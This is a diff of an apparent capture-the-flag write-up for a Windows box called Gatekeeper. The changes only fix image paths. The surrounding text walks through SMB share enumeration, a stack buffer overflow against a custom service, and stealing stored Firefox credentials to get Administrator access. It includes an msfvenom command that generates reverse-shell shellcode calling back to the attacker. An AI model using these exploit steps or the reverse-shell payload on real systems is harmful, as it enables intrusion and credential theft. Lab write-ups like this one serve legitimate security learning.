@@ -75,17 +75,17 @@ Looks like we're dealing with a Windows machine and there are 11 ports open:
 
 There are no web components here so I'll start enumerating SMB shares as Guest logon is enabled.
 
-![](../assets/img/2026-01-22-Gatekeeper/1.png)
+![](/assets/img/2026-01-22-Gatekeeper/1.png)
 
 The machine is most likely running a very old Windows 7 Server build, and we have read access to a Users share. Let's connect with SMBclient and pull files from it.
 
-![](../assets/img/2026-01-22-Gatekeeper/2.png)
+![](/assets/img/2026-01-22-Gatekeeper/2.png)
 
 There is a file called gatekeeper.exe in a Share folder as well as some sensitive files under /default. I transfer the executable to my local machine to dig into it and find that it seems to be the mystery service running on port 31337.
 
-![](../assets/img/2026-01-22-Gatekeeper/3.png)
+![](/assets/img/2026-01-22-Gatekeeper/3.png)
 
-![](../assets/img/2026-01-22-Gatekeeper/4.png)
+![](/assets/img/2026-01-22-Gatekeeper/4.png)
 
 A line in the Strings output caught my eye: 
 
@@ -130,7 +130,7 @@ while True:
   time.sleep(1)
 ```
 
-![](../assets/img/2026-01-22-Gatekeeper/5.png)
+![](/assets/img/2026-01-22-Gatekeeper/5.png)
 
 Next, I test for the amount of bytes needed in order for us to reach and overwrite the extended instruction pointer (EIP). I use Metasploit's `pattern_create.rb` module to find the offset here.
 
@@ -164,11 +164,11 @@ except (socket.error, socket.timeout):
 
 After sending the pattern_offset payload to the .exe and checking the registers again, I find that the EIP is overwritten with 39654138. We can use Metasploit's pattern_offset.rb to calculate our requirements.
 
-![](../assets/img/2026-01-22-Gatekeeper/6.png)
+![](/assets/img/2026-01-22-Gatekeeper/6.png)
 
 Great, now we can update our script's offset and return bytes to confirm this actually works.
 
-![](../assets/img/2026-01-22-Gatekeeper/7.png)
+![](/assets/img/2026-01-22-Gatekeeper/7.png)
 
 Rerunning it and checking registers returns the EIP with a value of 43434343 which decodes to CCCC (our RETN string) confirming that we have control over it.
 
@@ -178,7 +178,7 @@ _Note: I actually got pretty lucky here, so don't do what I did. You really shou
 
 Now, we need to find a JMP ESP address that does not include the bad characters we'll supply. I'm using Immunity debugger as the article does as well, however this is relatively easy to do.
 
-![](../assets/img/2026-01-22-Gatekeeper/8.png)
+![](/assets/img/2026-01-22-Gatekeeper/8.png)
 
 Final step in preparation for the payload is our Shellcode to reach back to us. I use msfvenom for this step but [this site](https://shell-storm.org/shellcode/index.html) contains plenty of pre-made ones.
 
@@ -186,7 +186,7 @@ Final step in preparation for the payload is our Shellcode to reach back to us. 
 msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=<your-port> EXITFUNC=thread -b "\x00\x0a" -f c
 ```
 
-![](../assets/img/2026-01-22-Gatekeeper/9.png)
+![](/assets/img/2026-01-22-Gatekeeper/9.png)
 
 Let's edit our script one last time and hope this works as intended:
 - OFFSET = 146
@@ -277,11 +277,11 @@ I spent some time trying to manually extract base64 encoded creds with layered e
 
 In order for this to work we need a valid 'profile' (directory) which must contain at least these four necessary files inside. 
 
-![](../assets/img/2026-01-22-Gatekeeper/10.png)
+![](/assets/img/2026-01-22-Gatekeeper/10.png)
 
 Running the script grabs a login for a user named mayor. Both WinRM and RDP don't work to grab a shell, but psexec seems to work just fine.
 
-![](../assets/img/2026-01-22-Gatekeeper/11.png)
+![](/assets/img/2026-01-22-Gatekeeper/11.png)
 
 Upon logging in, we're greeted with full Administrator privileges over the system and can grab the final flag under `C:\Users\Mayor\Desktop` to complete the box.
 
